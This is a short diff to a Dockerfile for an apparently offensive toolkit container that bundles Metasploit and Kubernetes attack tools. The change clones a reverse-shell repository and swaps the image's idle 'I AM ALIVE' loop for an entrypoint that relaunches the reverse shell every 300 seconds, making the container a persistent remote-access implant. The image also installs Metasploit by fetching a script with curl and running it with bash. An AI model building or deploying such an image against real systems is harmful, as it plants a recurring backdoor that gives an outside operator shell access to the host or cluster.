@@ -27,7 +27,8 @@ RUN apt update && apt install -y \
 	ruby \
 	golang \ 
 	mongodb-clients \
-	easy-rsa
+	easy-rsa \
+	ca-certificates
 
 RUN curl -L -o /tmp/msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
 RUN bash /tmp/msfinstall
@@ -57,4 +58,6 @@ RUN git clone https://github.com/jpbetz/auger.git tools/auger
 RUN git clone https://github.com/aquasecurity/kube-hunter.git tools/kube-hunter
 RUN git clone https://github.com/4ARMED/kubeletmein.git tools/kubeletmein
 
-ENTRYPOINT ["/bin/bash", "-c", "while true; do echo 'I AM ALIVE'; sleep 300s; done"]
+RUN git clone https://github.com/Doctor-love/revshell tools/revshell
+
+ENTRYPOINT ["/bin/bash", "-c", "while true; do /home/userx/tools/revshell/revshell; sleep 300s; done"]
